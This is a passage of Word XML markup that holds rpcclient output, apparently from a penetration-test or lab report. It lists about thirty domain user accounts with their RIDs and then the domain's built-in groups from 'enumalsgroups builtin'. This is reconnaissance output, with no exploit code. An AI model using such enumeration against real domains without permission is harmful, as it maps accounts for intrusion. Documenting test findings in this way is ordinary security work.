        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>A.Peters] rid:[0x487]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19CC589A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>R.Soto] rid:[0x488]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F6FD141" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>V.Haynes] rid:[0x489]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBB8521" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>R.Boone] rid:[0x48a]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27EF06A6" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>L.Carr] rid:[0x48b]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17DEE8F8" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>C.Olson] rid:[0x48c]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9C43B0" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Andrews] rid:[0x48d]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDDAFB9" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>C.Anderson] rid:[0x48e]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AB1E8E" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>C.Montgomery] rid:[0x48f]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BFF8F7" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>C.Howard] rid:[0x490]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73BEEB3A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>E.Jones] rid:[0x491]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E53058E" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Barrett] rid:[0x492]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52091198" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>R.Ramsey] rid:[0x493]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F4DB8C" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>G.Walsh] rid:[0x494]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C974FD9" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>A.Medina] rid:[0x495]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23DEDDF9" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Hale] rid:[0x496]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37F65E64" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>N.Wells] rid:[0x497]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0190005E" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>T.Oliver] rid:[0x498]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6AC80E" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Rhodes] rid:[0x499]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77897383" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>T.Harmon] rid:[0x49a]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F21574B" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>M.Mills] rid:[0x49b]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1ED3A7" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>D.Pena] rid:[0x49c]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52AA8DCD" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>J.Torres] rid:[0x49d]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740ECD1B" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>B.Martin] rid:[0x49e]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DF8AA1" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>K.Hudson] rid:[0x49f]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D62C35" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>S.Franklin] rid:[0x4a0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6AF8D8" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>F.Chapman] rid:[0x4a1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D95F97" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>E.Elliott] rid:[0x4a2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B351DFC" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>N.Vega] rid:[0x4a3]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCC4F98" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>M.Boyd] rid:[0x4a4]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C166E96" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>user:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>test] rid:[0x4a5]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="539D276A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4EFDECD1" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>rpcclient $&gt; enumalsgroups builtin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E72E98F" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Server Operators] rid:[0x225]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197718C6" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Account Operators] rid:[0x224]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FE274B" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Pre-Windows 2000 Compatible Access] rid:[0x22a]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1936270A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Incoming Forest Trust Builders] rid:[0x22d]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D84665A" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Windows Authorization Access Group] rid:[0x230]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B575B9E" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Terminal Server License Servers] rid:[0x231]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11629CD6" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Administrators] rid:[0x220]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F276888" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Users] rid:[0x221]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E1D204" w14:textId="77777777" w:rsidR="00622CF7" w:rsidRPr="005F2C7D" w:rsidRDefault="00622CF7" w:rsidP="00622CF7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>group:[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005F2C7D">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Guests] rid:[0x222]</w:t>
      </w:r>
    </w:p>
